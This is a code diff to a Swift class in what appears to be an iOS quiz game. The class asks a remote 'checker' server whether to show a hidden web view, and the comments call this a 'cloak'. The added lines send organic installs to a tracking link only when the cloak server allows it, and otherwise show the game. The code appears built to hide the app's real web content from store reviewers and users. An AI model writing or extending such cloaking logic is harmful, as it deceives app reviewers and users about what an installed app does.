@@ -39,7 +39,7 @@ class NewLogic {
     func checkerDataUsage(completion: @escaping (String) -> ()) {
         
         //let url = URL(string: "https://integr-testing.site/checker/?token=\(Consts.CLOAK_TOKEN)")!
-        let url = URL(string: "https://integr-testing.site/apps_v2/checker/?bundle=com.gb.luckyquiz")!
+        let url = URL(string: "https://integr-testing.site/apps_v2/checker/?bundle=com.gb.luckyquizz")!
         
         getDataFromChecker(url: url) { result in
             
@@ -102,15 +102,22 @@ class NewLogic {
                         return
                     }
                     
-                    // 5 - no naming - create organic
-                    let key = self.organic?.org_key ?? "oswn6tvtmztmokzwovqc"
-                    let sub1 = self.organic?.sub1 ?? "none"
-                    let sub2 = self.organic?.sub2 ?? "none"
-                    let sub3 = self.organic?.sub3 ?? "none"
+                    // 5 - no naming - create organic from cloak
+                    if (self.organic?.org_status == "true") {
+                        
+                        let key = self.organic?.org_key ?? "oswn6tvtmztmokzwovqc"
+                        let sub1 = self.organic?.sub1 ?? "none"
+                        let sub2 = self.organic?.sub2 ?? "none"
+                        let sub3 = self.organic?.sub3 ?? "none"
+                        
+                        let organicData = ResultData(key: key, sub1: sub1, sub2: sub2, sub3: sub3, source: "none")
+                        print("Organic data - \(organicData)")
+                        formLinkFromResult(organicData, status)
+                    }
                     
-                    let organicData = ResultData(key: key, sub1: sub1, sub2: sub2, sub3: sub3, source: "none")
-                    print("Organic data - \(organicData)")
-                    formLinkFromResult(organicData, status)
+                    // 6 - no organic cloak - show game
+                    UserDefaults.standard.set("false", forKey: "SHOW_WEB")
+                    print("No organic cloak")
                 }
             }
         }
